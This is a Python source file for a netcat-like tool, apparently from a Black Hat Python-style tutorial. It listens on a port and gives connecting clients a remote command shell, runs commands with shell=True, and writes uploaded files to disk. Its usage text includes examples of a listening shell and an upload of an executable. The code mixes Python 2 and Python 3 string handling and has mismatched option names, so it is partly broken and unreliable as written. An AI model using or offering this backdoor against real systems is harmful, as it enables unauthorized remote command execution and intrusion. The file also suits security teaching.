#!/bin/env python3

import sys
import socket           # Basic module necessary
import getopt
import threading        # For server instances
import subprocess       # For subshells

# Define some global variables
listen                = False
command               = False
upload                = False
execute               = ""
target                = ""
upload_destination    = ""
port                  = 0

def usage():
    print("BHP Net Tool\n\n"+
    "Usage: bhpnet.py -t target_host"+
    " -p target_port\n"+
    " -l --listen       Listen on [host]:[port]"+
    "\n                   for incoming "+
    "connections.\n"+
    " -e --execute=file Execute the given file\n"+
    "                   upon receiving a\n"+
    "                   connection.\n"+
    " -c --command      Initialize a command "+
    "shell.\n"+
    " -u --upload-destination\n"+
    "                   Upon receiving\n"+
    "                   a connection upload a\n"+ 
    "                   file and write to \n"+
    "                   [destination].\n"+
    "\nExamples:\n"+
    "bhpnet.py -t 192.168.0.1 -p 5555 -l -c\n" +
    "bhpnet.py -t 192.168.0.1 -p 5555 -l" +
    " -u=c:\\target.exe\n" +
    "echo ABCDEFGHI | ./bhpnet.py" +
    " 192.168.11.12 -p 135")
    sys.exit(0)
  
def main():
  global listen
  global command
  global execute
  global target
  global upload_destination
  global port
  
  if not len(sys.argv[1:]):
    usage()
  
  # Read the commandline options
  try:
    opts, args = getopt.getopt(sys.argv[1:],
                 "hle:t:p:cu:", ["help","listen",
                 "execute","target","port",
                 "command","upload"])
  except getopt.GetoptError as err:
    print(str(err))
    usage()
    
  for o,a in opts:
    if o in ("-h","--help"):
        usage()
    elif o in ("-l","--listen"):
        listen = True
    elif o in ("-e","--execute"):
        execute = a
    elif o in ("-c","--commandshell"):
        command = True
    elif o in ("-u","--upload"):
        upload_destination = a
    elif o in ("-t","--target"):
        target = a
    elif o in ("-p","--port"):
        port = int(a)
    else:
        assert False,"Unhandled Option"
  
  # Are we going to listen or just send data
  # from stdin?

  if not listen and len(target) and port > 0:
      buffer = sys.stdin.read()
      client_sender(buffer)

  if listen:
      server_loop()

def client_sender(buffer):
  client = socket.socket(socket.AF_INET,
                         socket.SOCK_STREAM)

  try:
    # Connect to a target host
    client.connect((target,port))

    if len(buffer):
      client.send(buffer)

    while True:
      # Now wait for data back
      recv_len = 1
      response = ""

      while recv_len:
        data = client.recv(4096)
        recv_len = len(data)
        response += data.decode()

        if recv_len < 4096:
          break

        print(response)

        buffer = raw_input("")
        buffer += "\n"

        client.send(buffer)
  except:
    print("[*] Exception! Exiting.")

    # Tear down the connection
    client.close()

def server_loop():
    global target
    global port

    # If no target is defined, 
    # we listen on all interfaces.
    if not len(target):
        target = "0.0.0.0"

    server = socket.socket(socket.AF_INET,
                           socket.SOCK_STREAM)
    server.bind((target,port))

    server.listen(5)

    while True:
        client_socket, addr = server.accept()
        
        # Spin off a thread to 
        # handle our new client
        client_thread = threading.Thread(
                target=client_handler,
                args=(client_socket,))
        client_thread.start()

def run_command(command):
    # Trim the newline
    command = command.rstrip()

    # Run the command and get the output back
    try:
        output = subprocess.check_output(
                 command, 
                 stderr=subprocess.STDOUT,
                 shell=True)
    except:
        output = "Failed to execute command.\n"

    return output

def client_handler(client_socket):
  global upload
  global execute
  global command
  
  # Check for upload
  if len(upload_destination):
    # Read in all the bytes and
    # write to our destination
    file_buffer = ""
    
    # Keep reading data until none is available
    while True:
      data = client_socket.recv(1024)
      
      if not data:
        break
      else:
        file_buffer += data
        
      # Now we take these bytes and
      # try to write them out
      try:
        file_descriptor = open(upload_destination,
                          "wb")
        file_descriptor.write(file_buffer)
        file_descriptor.close()
        
        # Acknowledge that we wrote the file out
        client_socket.send("Successfully saved "+
          "file to %s\r\n" % upload_destination)
      except:
        client_socket.send("Failed to save file "+
          "to %s\r\n" % upload_destination)
    
  # Check for command execution
  if len(execute):
    output = run_command(execute)
    client_socket.send(output.encode("UTF-8"))  
    
  # Now we go into another loop if
  # a command shell is requested
  if command:
    while True:
      # Show a simple prompt
      client_socket.send("<BHP:#> ")
      
      cmd_buffer = ""
      while "\n" not in cmd_buffer:
        cmd_buffer += client_socket.recv(1024)
      
      response = run_command(cmd_buffer)
      client_socket.send(response)
        

main()
